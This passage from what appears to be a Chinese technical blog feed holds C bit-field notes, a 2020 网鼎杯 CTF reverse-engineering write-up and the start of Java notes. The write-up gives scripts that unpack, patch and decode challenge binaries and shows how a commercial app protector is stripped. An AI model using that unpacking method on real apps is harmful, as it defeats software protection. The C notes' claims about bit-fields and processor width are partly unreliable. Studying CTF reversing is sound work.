class="keyword">int</span> a:<span class="number">8</span>;</span><br><span class="line">    <span class="keyword">int</span> b:<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> c:<span class="number">6</span>;</span><br><span class="line">&#125;data;</span><br></pre></td></tr></table></figure><p>说明<code>data</code>为<code>bit_struc</code>t变量, 共占两个字节。其中位域a占8位, 位域b占2位, 位域c占6位</p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><ul><li><p>一个位域必须存储在同一个字节中, 不能跨两个字节。如一个字节所剩空间不够存放另一位域时, 应从下一单元起存放该位域。也可以有意使某位域从下一单元开始（使用无名位域）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bit_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> a:<span class="number">4</span></span><br><span class="line">    <span class="keyword">unsigned</span> b:<span class="number">5</span> <span class="comment">/*从下一单元开始存放*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> c:<span class="number">4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>由于位域不允许跨两个字节, 因此位域的长度不能大于一个字节的长度</p></li><li><p>位域可以无位域名, 这时它只用来作填充或调整位置。无名的位域是不能使用的</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">k</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">int</span> a:<span class="number">1</span></span><br><span class="line">    <span class="keyword">int</span> :<span class="number">2</span> <span class="comment">/*无位域名, 该2位不能使用*/</span></span><br><span class="line">    <span class="keyword">int</span> b:<span class="number">3</span></span><br><span class="line">    <span class="keyword">int</span> c:<span class="number">2</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a:<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> b:<span class="number">3</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">100</span>] = <span class="string">&quot;0134324324afsadfsdlfjlsdjfl&quot;</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">A</span> <span class="title">d</span>;</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;d, str, <span class="keyword">sizeof</span>(A));</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; d.a &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; d.b &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在64位机器上运行结果如下:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  Desktop g++ 1.cpp -o 1</span><br><span class="line">➜  Desktop ./1</span><br><span class="line">-16</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>解析:在默认情况下, 为了方便对结构体内元素的访问和管理, 当结构体内的元素长度都小于处理器的位数的时候, 便以结构体里面最长的元素为对其单位, 即结构体的长度一定是最长的数据元素的整数倍；如果有结构体内存长度大于处理器位数的元素, 那么就以处理器的位数为对齐单元。由于是32位处理器, 而且结构体中a和b元素类型均为int（也是4个字节）, 所以结构体的A占用内存为4个字节。</p><p>例程中定义了位域结构A, 两个个位域为a（占用5位）, b（占用3位）, 所以a和b总共占用了结构A一个字节（低位的一个字节）</p><p>当程序运行到14行时, d内存分配情况:</p><table><thead><tr><th>高位</th><th>00110100</th><th>00110011</th><th>00110001</th><th>00110000</th><th>低位</th></tr></thead><tbody><tr><td></td><td>‘4’</td><td>‘3’</td><td>‘1’</td><td>‘0’</td><td></td></tr></tbody></table><p>  其中<code>d.a</code>和<code>d.b</code>占用d低位一个字节（00110000）, <code>d.a</code> : 10000, <code>d.b</code> : 001<br>   <code>d.a</code>内存中二进制表示为10000, 由于<code>d.a</code>为有符号的整型变量, 输出时要对符号位进行扩展, 所以结果为-16（二进制为11111111111111111111111111110000）<br>   <code>d.b</code>内存中二进制表示为001, 由于<code>d.b</code>为有符号的整型变量, 输出时要对符号位进行扩展, 所以结果为1（二进制为00000000000000000000000000000001）</p><h2 id="位域对齐"><a href="#位域对齐" class="headerlink" title="位域对齐"></a>位域对齐</h2><p>如果结构体中含有位域(bit-field), 那么VC中准则是:</p><ul><li>如果相邻位域字段的类型相同, 且其位宽之和小于类型的sizeof大小, 则后面的字段将紧邻前一个字段存储, 直到不能容纳为止；</li><li>如果相邻位域字段的类型相同, 但其位宽之和大于类型的sizeof大小, 则后面的字段将从新的存储单元开始, 其偏移量为其类型大小的整数倍；</li><li>如果相邻的位域字段的类型不同, 则各编译器的具体实现有差异, VC6采取不压缩方式（不同位域字段存放在不同的位域类型字节中）, Dev-C++和GCC都采取压缩方式；</li><li>系统会先为结构体成员按照对齐方式分配空间和填塞（padding）, 然后对变量进行位域操作.</li></ul>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 网鼎杯</title>
      <link href="/wp-games-2020wd/"/>
      <url>/wp-games-2020wd/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>昨日公布结果,应该可以把Write up放出来啦~ 自己还是好菜…….</p><h3 id="bang"><a href="#bang" class="headerlink" title="bang"></a>bang</h3><p>2018年的梆梆加固免费版</p><p>找到个工具可以脱<a href="https://github.com/hluwa/FRIDA-DEXDump">https://github.com/hluwa/FRIDA-DEXDump</a></p><p>脱壳得一个dex,用JEB3 直接可以打开,发现flag</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/bang-flag.png" alt="bang-flag"></p><p><code>flag&#123;borring_things&#125;</code></p><h3 id="jocker"><a href="#jocker" class="headerlink" title="jocker"></a>jocker</h3><p>omg解出来一个假的flag,真正flag在</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/jocker-encrypr-final.png" alt="jocker-encrypr-final"></p><p>encrypt函数经历了代码自修改</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/jocker-encrypr-a-code.png" alt="jocker-encrypr-a-code"></p><p>IDA patch脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line">ida_bytes buf = <span class="built_in">map</span>(<span class="built_in">ord</span>, ida_bytes.get_bytes(<span class="number">0x0401500</span>, <span class="number">186</span>))</span><br><span class="line">buf = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: x ^ <span class="number">0x41</span>, buf) ida_bytes.patch_bytes(<span class="number">0x0401500</span>,<span class="built_in">str</span>(<span class="built_in">bytearray</span>(buf)))</span><br></pre></td></tr></table></figure><p>Patch完发现是个简单异或</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/jocker-encrypt-code.png" alt="jocker-encrypt-code"></p><p>这里解出前半段  ,后半段在finally</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/jocker-final-code.png" alt="jocker-final-code"></p><p>这里猜了一下应该也是简单异或,直接拿最后一个异或‘}’,得到71,然后全部异或71</p><p>拿到flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">omg</span>(<span class="params">flag</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">        <span class="keyword">if</span> i &amp; <span class="number">1</span>:</span><br><span class="line">            flag[i] += i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag[i] ^= i</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">chr</span>, flag))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">find_me = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, <span class="string">&quot;hahahaha_do_you_find_me?&quot;</span>))</span><br><span class="line"></span><br><span class="line">cmp = [<span class="number">0x66</span>, <span class="number">0x6B</span>, <span class="number">0x63</span>,</span><br><span class="line">       <span class="number">0x64</span>, <span class="number">0x7F</span>,</span><br><span class="line">       <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x64</span>,</span><br><span class="line">       <span class="number">0x3B</span>, <span class="number">0x56</span>,</span><br><span class="line">       <span class="number">0x6B</span>, <span class="number">0x61</span>, <span class="number">0x7B</span>,</span><br><span class="line">       <span class="number">0x26</span>, <span class="number">0x3B</span>,</span><br><span class="line">       <span class="number">0x50</span>, <span class="number">0x63</span>, <span class="number">0x5F</span>,</span><br><span class="line">       <span class="number">0x4D</span>, <span class="number">0x5A</span>,</span><br><span class="line">       <span class="number">0x71</span>, <span class="number">0x0C</span>, <span class="number">0x37</span>,</span><br><span class="line">       <span class="number">0x66</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(len(cmp))</span></span><br><span class="line"></span><br><span class="line">omg(cmp)</span><br><span class="line"></span><br><span class="line">real = [<span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x09</span>,</span><br><span class="line">        <span class="number">0x06</span>, <span class="number">0x13</span>,</span><br><span class="line">        <span class="number">0x05</span>, <span class="number">0x58</span>, <span class="number">0x56</span>,</span><br><span class="line">        <span class="number">0x3E</span>, <span class="number">0x06</span>,</span><br><span class="line">        <span class="number">0x0C</span>, <span class="number">0x3C</span>, <span class="number">0x1F</span>,</span><br><span class="line">        <span class="number">0x57</span>, <span class="number">0x14</span>,</span><br><span class="line">        <span class="number">0x6B</span>, <span class="number">0x57</span>, <span class="number">0x59</span>,</span><br><span class="line">        <span class="number">0x0D</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(real)):</span><br><span class="line">    real[i] ^= find_me[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">chr</span>, real))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">v3 = [<span class="string">&#x27;0&#x27;</span>] * <span class="number">5</span></span><br><span class="line">v3[<span class="number">0</span>] = <span class="string">&#x27;%&#x27;</span></span><br><span class="line">v3[<span class="number">1</span>] = <span class="string">&#x27;t&#x27;</span></span><br><span class="line">v3[<span class="number">2</span>] = <span class="string">&#x27;p&#x27;</span></span><br><span class="line">v3[<span class="number">3</span>] = <span class="string">&#x27;&amp;&#x27;</span></span><br><span class="line">v3[<span class="number">4</span>] = <span class="string">&#x27;:&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v3)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(v3[i]) ^ <span class="number">71</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>flag&#123;d07abccf8a410cb37a&#125;</code></p><h3 id="singal"><a href="#singal" class="headerlink" title="singal"></a>singal</h3><p>IDA 打开,主逻辑是个虚拟机,观察了一下,主流程就是加减乘除异或,最后进行对比,那么直接模拟流程,用z3暴力解即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x = [BitVec(<span class="string">&quot;x%d&quot;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>)]</span><br><span class="line">res = x[:]</span><br><span class="line">op = [<span class="number">0x0000000A</span>, <span class="number">0x00000004</span>, <span class="number">0x00000010</span>, <span class="number">0x00000008</span>, <span class="number">0x00000003</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000020</span>, <span class="number">0x00000008</span>, <span class="number">0x00000005</span>, <span class="number">0x00000003</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000001</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000003</span>, <span class="number">0x00000008</span>, <span class="number">0x00000003</span>, <span class="number">0x00000021</span>, <span class="number">0x00000001</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000009</span>, <span class="number">0x00000008</span>, <span class="number">0x00000003</span>, <span class="number">0x00000020</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000051</span>, <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000024</span>, <span class="number">0x00000001</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x00000002</span>, <span class="number">0x00000025</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000036</span>,</span><br><span class="line">        <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000041</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000020</span>, <span class="number">0x00000008</span>, <span class="number">0x00000005</span>, <span class="number">0x00000001</span>, <span class="number">0x00000001</span>, <span class="number">0x00000005</span>, <span class="number">0x00000003</span>, <span class="number">0x00000008</span>, <span class="number">0x00000002</span>, <span class="number">0x00000025</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000009</span>, <span class="number">0x00000008</span>, <span class="number">0x00000003</span>, <span class="number">0x00000020</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000041</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000001</span>, <span class="number">0x00000007</span>, <span class="number">0x00000022</span>, <span class="number">0x00000007</span>, <span class="number">0x0000003F</span>, <span class="number">0x00000007</span>, <span class="number">0x00000034</span>, <span class="number">0x00000007</span>, <span class="number">0x00000032</span>, <span class="number">0x00000007</span>, <span class="number">0x00000072</span>, <span class="number">0x00000007</span>, <span class="number">0x00000033</span>, <span class="number">0x00000007</span>, <span class="number">0x00000018</span>, <span class="number">0x00000007</span>, <span class="number">0xFFFFFFA7</span>, <span class="number">0x00000007</span>, <span class="number">0x00000031</span>, <span class="number">0x00000007</span>, <span class="number">0xFFFFFFF1</span>, <span class="number">0x00000007</span>, <span class="number">0x00000028</span>, <span class="number">0x00000007</span>, <span class="number">0xFFFFFF84</span>, <span class="number">0x00000007</span>, <span class="number">0xFFFFFFC1</span>, <span class="number">0x00000007</span>, <span class="number">0x0000001E</span>, <span class="number">0x00000007</span>, <span class="number">0x0000007A</span>]</span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">t = <span class="number">0</span></span><br><span class="line">check_num = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line">check_numi = <span class="number">0</span></span><br><span class="line">check_numj = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">ip = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (ip &lt; <span class="built_in">len</span>(op)):</span><br><span class="line">    <span class="keyword">if</span> op[ip] == <span class="number">1</span>:</span><br><span class="line">        check_num[check_numi] = t</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">        check_numi += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op[ip] == <span class="number">2</span>:</span><br><span class="line">        t = x[index]+op[ip+<span class="number">1</span>]</span><br><span class="line">        ip += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> op[ip] == <span class="number">3</span>:</span><br><span class="line">        t = x[index]-op[ip+<span class="number">1</span>]</span><br><span class="line">        ip += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> op[ip] == <span class="number">4</span>:</span><br><span class="line">        t = x[index] ^ op[ip+<span class="number">1</span>]</span><br><span class="line">        ip += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> op[ip] == <span class="number">5</span>:</span><br><span class="line">        t = x[index]*op[ip+<span class="number">1</span>]</span><br><span class="line">        ip += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> op[ip] == <span class="number">6</span>:</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op[ip] == <span class="number">7</span>:</span><br><span class="line">        s.add(check_num[check_numj] == op[ip+<span class="number">1</span>])</span><br><span class="line">        check_numj += <span class="number">1</span></span><br><span class="line">        ip += <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> op[ip] == <span class="number">8</span>:</span><br><span class="line">        x[j] = t</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op[ip] == <span class="number">10</span>:</span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op[ip] == <span class="number">11</span>:</span><br><span class="line">        t = x[index] - <span class="number">1</span></span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op[ip] == <span class="number">12</span>:</span><br><span class="line">        t = x[index] + <span class="number">1</span></span><br><span class="line">        ip += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">        flag += <span class="built_in">chr</span>(m[i].as_long())</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><code>flag&#123;757515121f3d478&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 笔记</title>
      <link href="/note-language-java-note/"/>
      <url>/note-language-java-note/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>跟着b站大学<a href="https://www.bilibili.com/video/BV1T7411m7Ta%E5%AD%A6%E4%B9%A0java">https://www.bilibili.com/video/BV1T7411m7Ta学习java</a>的读书笔记</li><li>使用的是<code>Java 8</code></li></ul><h2 id="Java语言开发环境的搭建"><a href="#Java语言开发环境的搭建" class="headerlink" title="Java语言开发环境的搭建"></a>Java语言开发环境的搭建</h2><h3 id="Java虚拟机——JVM"><a href="#Java虚拟机——JVM" class="headerlink" title="Java虚拟机——JVM"></a>Java虚拟机——JVM</h3><ul><li><p><strong>JVM</strong>(java Virtual Machine) : Java虚拟机, 是运行所有Java程序的假想计算机, 是Java程序的运行环境, 是Java最具吸引力的特性之一, 我们编写的Java代码, 都运在<code>JVM</code>之上</p></li><li><p><strong>跨平台</strong>:任何软件的运行, 都必须要运行在操作系统之上, 而我们用Java编写的软件可以在任何的操作系统上, 这个特性称为<strong>Java语言的跨平台性</strong>, 该特性是由JVM实现的, 我们编写的程序运行在JVM上, 而JVM运行在操作系统上</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/java-cross_platform.jpg" alt="java-cross_platform"></p></li><li><p>如图, java的虚拟机本身不具备跨平台功能的, 每个操作系统下都由不同版本的虚拟机</p></li></ul><h3 id="JRE-和-JDK"><a href="#JRE-和-JDK" class="headerlink" title="JRE 和 JDK"></a>JRE 和 JDK</h3><ul><li><p><strong>JRE</strong><code>(Java Runtime Environmen)</code> : 是Java程序的运行时环境, 包含<code>JVM</code>和运行时所需要的<code>核心类库</code></p></li><li><p><strong>JDK</strong>（<code>Java Development Kit</code>）: 是Java程序开发工具包, 包含<code>JRE</code>和开发人员使用的工具</p></li><li><p>关系</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/java-relation.jpg" alt="java-relation"></p></li></ul><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 单行注释</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     多行注释</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><ul><li>有特殊含义、被保留的、不能随意使用的字符</li></ul><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><p><code>在程序运行的过程中不会改变的量</code></p><ol><li>字符串常量, <code>&quot; &quot;</code>双引号引起来的部分, 例如<code>&quot;abd&quot;、 &quot;Hello&quot;、“123”</code></li><li>整数常量, 例如: <code>100, 200, 0, -250</code></li><li>浮点数常量, 例如:<code>2.5, -3.14</code></li><li>字符串常量, 例如: <code>&#39;A&#39;, ’b‘, &#39;9&#39;, &#39;中&#39;</code><ul><li>Java中的一个char类型标识一个utf-16编码的代码单元, 也就是两个字节, 因此, 不像C语言中文无法代表一个字符</li><li>char真实的含义是描述了UTF-16编码中的一个<strong>代码单元</strong>, 而不是一个<strong>字符</strong></li></ul></li><li>布尔常量, <code>true, false</code></li><li>空常量, <code>null</code>, 代表没有任何数据</li></ol><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h4><ul><li>整数型: <code>byte</code> <code>short</code> <code>int</code> <code>long</code></li><li>浮点型: <code>float</code> <code>double</code><ul><li>浮点型可能只是一个近似值, 并非精确值, 例如<code>1/3</code>是无法精确表示的</li></ul></li><li>字符型: <code>char</code></li><li>布尔型:    <code>boolean</code></li></ul><h4 id="引用数据类型"><a href="#引用数据类型" class="headerlink" title="引用数据类型"></a>引用数据类型</h4><ul><li>字符串、数组、类、接口、Lambda</li></ul><h3 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h3><p>这部分和C/C++几乎一样, 我直接跳掉了</p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><ul><li><code>参数</code>:进入方法的数据（可以没有）</li><li><code>返回值</code>: 方法执行后的数据结果（可以没有）</li><li><code>修饰符</code>: 例如<code>public static</code></li><li><code>返回类型</code>:对应返回值的类型</li><li><code>方法名称</code>:方法名字, 规则与变量意义, 建议符合驼峰命名法</li><li><code>参数类型</code>:对应参数的类型</li><li><code>方法体</code>:方法需要做的事情, 若干代码</li><li><code>return</code>: （可以没有）<ul><li>将返回值返还调用处</li><li>终止当前方法</li></ul></li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">修饰符 返回类型 方法名称(参数类型 参数名称, ....) &#123;</span><br><span class="line">    方法体</span><br><span class="line">    <span class="keyword">return</span> 返回值;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="调用流程"><a href="#调用流程" class="headerlink" title="调用流程"></a>调用流程</h4><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/java-function-call.jpg" alt="java-function-call"></p><h4 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h4><ul><li>名字相同, 但参数列表不同的方法</li><li>用于对类似功能的方法的名称进行复用, 也就是记住一个名称就可以使用类似的功, 例如<code>println()</code>就进行了多种类型的重载, 使得我们只需要记住<code>println()</code>就可以了。</li></ul><p>以数字相加为例</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b + c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c, <span class="keyword">int</span> d)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b + c + d;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li><p>不能方法嵌套定义</p></li><li><p>方法定义顺序无所谓</p></li><li><p><code>void</code>方法可以写<code>return</code>, 也可以不写</p></li><li><p>重载</p><ul><li><p>参数个数不同</p></li><li><p>参数类型不同</p></li><li><p>参数的多类型顺序不同</p><p>下面例子是允许的</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)(a + b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">double</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)(a + b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>任何数据类型都可以存放在数组中</p><h4 id="动态初始化"><a href="#动态初始化" class="headerlink" title="动态初始化"></a>动态初始化</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span>[] array = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">300</span>];</span><br><span class="line"><span class="keyword">double</span>[] array = <span class="keyword">new</span> <span class="keyword">double</span>[<span class="number">10</span>];</span><br><span class="line">String[] array = <span class="keyword">new</span> String[<span class="number">10</span>]</span><br></pre></td></tr></table></figure><ul><li>初始化默认值:<ul><li>整数类型, <code>0</code></li><li>浮点类型, <code>0.0</code></li><li>字符类型, <code>\u0000</code></li><li>布尔类型, <code>false</code></li><li>引用类型, <code>null</code></li></ul></li></ul><h4 id="静态初始化"><a href="#静态初始化" class="headerlink" title="静态初始化"></a>静态初始化</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span>[] array = <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line">String[] array = <span class="keyword">new</span> String[] &#123;<span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;World&quot;</span>&#125;;</span><br></pre></td></tr></table></figure><h4 id="省略格式"><a href="#省略格式" class="headerlink" title="省略格式"></a>省略格式</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span>[] arrayA = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;;</span><br></pre></td></tr></table></figure><h4 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h4><h5 id="数组越界异常（ArrayIndexOutOfBoundsException）"><a 